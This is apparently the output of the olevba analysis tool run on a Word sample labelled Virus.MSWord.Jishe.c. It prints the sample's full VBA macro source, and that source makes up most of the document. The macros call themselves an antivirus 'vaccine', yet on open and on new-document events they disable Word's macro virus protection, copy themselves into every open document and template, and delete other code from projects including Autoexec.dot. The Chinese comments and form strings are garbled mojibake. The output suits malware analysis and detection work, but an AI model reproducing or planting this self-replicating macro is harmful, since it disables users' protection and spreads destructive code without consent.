olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259 - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Version 1.0
'ÕâÊÇ±¾ÈËÑ§Ï°ÖÆ×÷µÄÒ»¸öºê²¡¶¾·ÀÉ±³ÌÐò,Ëü¿ÉÒÔ·ÀÖ¹²¿·ÖWORDºê²¡¶¾µÄ¸ÐÈ¾
'ÕâÐèÒªÓÐ´óÁ¿µÄºê²¡¶¾ÌØÕ÷Âë×÷ÎªÒÀ¾Ý,Èç¹ûÄã·¢ÏÖÓÐ±¾ÒßÃçÎÞÄÜÎªÁ¦µÄºê²¡¶¾
'¸ÐÐ»Äú¼°Ê±ÓëÎÒÁªÏµ,ÄãÒ²¿ÉÒÔ×ÔÑ¡ÐÞ¸Ä±¾³ÌÐò,ÒÔ¼ÓÇ¿±¾ÒßÃçµÄ¹¦Á¦
'Óë²¡¶¾×÷¶·Õù¾ÍÈçÍ¬µÖÓùÉç»á·¸×ï,ÐèÒª´ó¼ÒµÄ¹²Í¬Å¬Á¦
'»¶Ó­¼ÓÈëÆäÖÐ²¢³ÉÎªÒ»ÃûÕ½Ê¿,Ò²ÐíÄãÕýÊÇ´ó¼ÒÆÚ´ýÒÑ¾ÃµÄÓÂÊ¿
'
'³ÌÐòÉè¼Æ: ¼½É÷»ª
'°ì¹«µç»°:
'ÒÁÃÃµØÖ·: club@263.net
'
Sub AutoOpen()
    Dim file$
    Dim i As Integer
    Dim already, HasVirus As Boolean
    Dim LinesofCode As Long
    Dim answer As String
    Dim myDoc As Document
    Dim myTemp As Template
    
    answer = "MyMacroVirusKillerV1.0"
    
    'µ±Ç°´ò¿ªÄ£°åÎÄ¼þÃû
    file$ = WordBasic.[MacroFileName$]()
    
    '¹Ø±Õºê²¡¶¾±£»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    '¼ì²é´ò¿ªµÄÎÄµµÖÐÊÇ·ñÓÐ²¡¶¾
    HasVirus = False
    If (Documents.Count <> 0) Then
        For Each myDoc In Documents
            If (myDoc.VBProject.Protection = 0) Then
                For Each xitem In myDoc.VBProject.VBComponents
                    If (xitem.Name = "ThisDocument") Then
                        '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
                        LinesofCode = xitem.CodeModule.countoflines
                        If (LinesofCode > 0) And (Not HasVirus) Then
                            HasVirus = Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)
                        End If
                    ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                        'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
                        HasVirus = True
                    End If
                Next
            End If
        Next
    End If
    '¼ì²éÎÄµµÄ£°åÖÐÊÇ·ñÓÐ²¡¶¾
    If Not HasVirus Then
        For Each myTemp In Templates
            If (myTemp.VBProject.Protection = 0) Then
                For Each xitem In myTemp.VBProject.VBComponents
                    If (xitem.Name = "ThisDocument") Then
                        '´Ë²¿·ÖÓÐ´úÂëÊ±£¬Èç¹ûÕÒ²»µ½±¾Ä£¿é±êÖ¾ÔòÈÏ¶¨Îª²¡¶¾
                        LinesofCode = xitem.CodeModule.countoflines
                        If (LinesofCode > 0) And (Not HasVirus) Then
                            HasVirus = Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)
                        End If
                    ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                        'ÎÄµµÖÐ³ý±¾Ä£¿é´úÂëÖ®Íâ£¬Èç¹û»¹ÓÐÆäËü´úÂëÔòÈÏ¶¨Îª²¡¶¾
                        HasVirus = True
                    End If
                Next
            End If
        Next
    End If
    If HasVirus Then 'Èç¹ûÓÐ²¡¶¾£¬ÏòÓÃ»§Ìá³ö±¨¸æ
        Load VirusReport
        VirusReport.Show
    End If
    'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾´úÂë
    If (Documents.Count <> 0) Then
        For Each myDoc In Documents
            '¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë
            already = False
            If (myDoc.FullName = file$) Then
                already = True
            ElseIf (myDoc.VBProject.Protection = 0) Then
                For Each xitem In myDoc.VBProject.VBComponents
                    If (xitem.Name = "JiShenhua") And (xitem.Name <> "VirusReport") Then
                        already = True
                    End If
                Next xitem
            End If
            If (Not already) And (myDoc.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":JiShenhua", myDoc.FullName + ":JiShenhua"
                WordBasic.MacroCopy file$ + ":VirusReport", myDoc.FullName + ":VirusReport"
            End If
        Next
    End If
    'ÏòWORDÄ£°åÖÐÐ´Èë±¾´úÂë
    For Each myTemp In Templates
            '¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë
            already = False
            If (myTemp.FullName = file$) Then
                already = True
            ElseIf (myTemp.VBProject.Protection = 0) Then
                For Each xitem In myTemp.VBProject.VBComponents
                    If (xitem.Name = "JiShenhua") Then
                        already = True
                    End If
                Next xitem
            End If
            If (Not already) And (myTemp.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":JiShenhua", myTemp.FullName + ":JiShenhua"
                WordBasic.MacroCopy file$ + ":VirusReport", myTemp.FullName + ":VirusReport"
            End If
    Next
End Sub
Sub AutoNew()
    Dim file$
    Dim already, HasVirus As Boolean
    Dim LinesofCode As Long
    Dim answer As String
    Dim myDoc As Document
    
    answer = "FreeAntiWordMacroVirus"  '±¾²¡¶¾ÒßÃçÌØÕ÷Âë
    
    'µ±Ç°´ò¿ªÄ£°åÎÄ¼þÃû
    file$ = WordBasic.[MacroFileName$]()
    
    '¹Ø±Õºê²¡¶¾±£»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
    'ÏòÐÂ½¨µÄÎÄµµÖÐÐ´Èë±¾´úÂë
    If (Documents.Count <> 0) Then
        For Each myDoc In Documents
            '¼ì²éÎÄµµÖÐÊÇ·ñÒÑ¾­ÓÐ±¾Ä£¿é´úÂë
            already = False
            If (myDoc.FullName = file$) Then
                already = True
            ElseIf (myDoc.VBProject.Protection = 0) Then
                For Each xitem In myDoc.VBProject.VBComponents
                    If (xitem.Name = "JiShenhua") Then
                        already = True
                    End If
                Next xitem
            End If
            If (Not already) And (myDoc.VBProject.Protection = 0) Then
                WordBasic.MacroCopy file$ + ":JiShenhua", myDoc.FullName + ":JiShenhua"
                WordBasic.MacroCopy file$ + ":VirusReport", myDoc.FullName + ":VirusReport"
            End If
        Next myDoc
    End If
End Sub
Sub AutoExit()
'¹Ø±ÕWORDÖ®Ç°ÇåÀíautoexec.dotÎÄ¼þÖÐµÄ²¡¶¾
Dim LinesofCode As Long
Dim myDoc As Document
Dim FileName As String

'Çå³ý´ò¿ªÎÄµµÖÐµÄ²¡¶¾´úÂë
If (UCase(Dir("c:\Autoexec.dot")) = "AUTOEXEC.DOT") Then
    WordBasic.DisableAutoMacros
    Documents.Open FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
    For Each myDoc In Word.Documents
        If (UCase(myDoc.Name) = "AUTOEXEC.DOT") And (myDoc.VBProject.Protection = 0) Then
            For Each xitem In myDoc.VBProject.VBComponents
                If (xitem.Name = "ThisDocument") Then
                    LinesofCode = xitem.CodeModule.countoflines
                    If LinesofCode > 0 Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                    myDoc.VBProject.VBComponents.Remove (xitem)
                End If
            Next
            myDoc.Save
            myDoc.Close
        End If
    Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259 - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































'³õÊ¼»¯´°Ìå£¬Éè¶¨´°Ìå²ÎÊý
Private Sub UserForm_Initialize()
CheckBox1.Value = True
If Documents.Count <> 0 Then
    Information.Value = ActiveDocument.FullName
End If
Beep
End Sub
Private Sub CommandButtonNothing_Click()
'¹Ø±Õ´°Ìå£¬²»×÷ÈÎºÎ´¦Àí
Dim ret As Integer
ret = MsgBox("Áìµ¼£¬ËäÈ»Äã¿ÉÄÜ»áÅúÆÀÎÒ£¬µ«»¹ÊÇÒª¸æËßÄã£¬ÕâÑù×öÊÇºÜÎ£ÏÕµÄ¡£ÊÇ·ñÕæµÃ²»×ö´¦Àí£¬ÇëÖ¸Ê¾¡£", vbYesNo + vbDefaultButton2, "ÔÙ´Î±¨¸æ£¡")
If ret = vbYes Then
    Unload VirusReport
End If
End Sub
Private Sub CommandButtonOpenVisubasic_Click()
'´ò¿ªVisulBasic±à¼­Æ÷
    ShowVisualBasicEditor = True
End Sub
Private Sub CommandButtonDetail_Click()
'±¨¸æ²¡¶¾µÄÏêÏ¸Çé¿ö
Dim answer As String
Dim myStr As String
Dim myDoc As Document
Dim myTemp As Template

answer = "MyMacroVirusKillerV1.0"
myStr = ""
For Each myTemp In Word.Templates
    If (myTemp.VBProject.Protection = 0) Then
        For Each xitem In myTemp.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐ¿ÉÄÜÓÐ²¡¶¾¡£" + Chr(10)
                        If (xitem.CodeModule.Find("Document_Open", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Open¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_Close", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Close¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_New", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_New¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("insertlines", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äInsertLines¡£" + Chr(10)
                        End If
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿é¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
                If (xitem.CodeModule.Find("MacroCopy", 1, 1, 1 + LinesofCode, 1)) Then
                    myStr = myStr + myTemp.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äMacroCopy¡£" + Chr(10)
                End If
            End If
        Next
    End If
Next
For Each myDoc In Word.Documents
    If (myDoc.VBProject.Protection = 0) Then
        For Each xitem In myDoc.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐ¿ÉÄÜÓÐ²¡¶¾¡£" + Chr(10)
                        If (xitem.CodeModule.Find("Document_Open", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Open¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_Close", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_Close¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("Document_New", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×Ô¶¯ÔËÐÐ´úÂëDocument_New¡£" + Chr(10)
                        End If
                        If (xitem.CodeModule.Find("insertlines", 1, 1, 1 + LinesofCode, 1)) Then
                            myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äInsertLines¡£" + Chr(10)
                        End If
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿é¿ÉÄÜÊÇ²¡¶¾¡£" + Chr(10)
                If (xitem.CodeModule.Find("MacroCopy", 1, 1, 1 + LinesofCode, 1)) Then
                    myStr = myStr + myDoc.Name + "<" + xitem.Name + ">Ä£¿éÖÐÓÐ×ÔÎÒ¸´ÖÆÓï¾äMacroCopy¡£" + Chr(10)
                End If
            End If
        Next
    End If
Next
Information.Value = myStr
End Sub
Private Sub CommandButtonKill_Click()
'É±²¡¶¾
Dim LinesofCode As Long
Dim myDoc As Document
Dim myTemp As Template
Dim answer As String

answer = "MyMacroVirusKillerV1.0"
'Çå³ýAutoexec.dotÖÐµÄ²¡¶¾
If (UCase(Dir("c:\Autoexec.dot")) = "AUTOEXEC.DOT") Then
    WordBasic.DisableAutoMacros
    Documents.Open FileName:="c:\Autoexec.dot", AddToRecentFiles:=False
    Set myDoc = ActiveDocument
    If (myDoc.VBProject.Protection = 0) Then
        For Each xitem In myDoc.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, star, 1, star + LinesofCode, 1)) Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myDoc.VBProject.VBComponents.Remove (xitem)
            End If
        Next
        myDoc.Save
        myDoc.Close
    End If
End If
'Çå³ý´ò¿ªÎÄµµÖÐµÄ²¡¶¾´úÂë
For Each myDoc In Word.Documents
    If (myDoc.VBProject.Protection = 0) Then
        For Each xitem In myDoc.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myDoc.VBProject.VBComponents.Remove (xitem)
            End If
        Next
    End If
Next
'Çå³ýWORDÄ£°åÖÐµÄ²¡¶¾´úÂë
For Each myTemp In Word.Templates
    If (myTemp.VBProject.Protection = 0) Then
        For Each xitem In myTemp.VBProject.VBComponents
            If (xitem.Name = "ThisDocument") Then
                LinesofCode = xitem.CodeModule.countoflines
                If LinesofCode > 0 Then
                    If (Not xitem.CodeModule.Find(answer, 1, 1, 1 + LinesofCode, 1)) Then
                        xitem.CodeModule.DeleteLines 1, LinesofCode
                    End If
                End If
            ElseIf (xitem.Name <> "JiShenhua") And (xitem.Name <> "VirusReport") Then
                myTemp.VBProject.VBComponents.Remove (xitem)
            End If
        Next
    End If
Next
Unload VirusReport
MsgBox "°´ÕÕÄúµÄÖ¸Ê¾£¬ÎÒÒÑ¾­°Ñ»³ÒÉÊÇ²¡¶¾µÄ¶«¶«È«²¿ÇåÀíÍê±Ï£¬ ²»¹ýÒ²¿ÉÄÜºÃÐÄ°ìÁË»µÊÂ£¬ÄÇ¿É²»Òª¹ÖÎÒÓ´¡£", vbOKOnly, "¼½É÷»ªÏòÄú±¨¸æ£º"
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�QN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Nek�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�Q�b
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonDetail'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN 'Virus.MSWord.Jishe.c-d657d2a7ed2f0fd11e34455092b3f7e895a63259' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

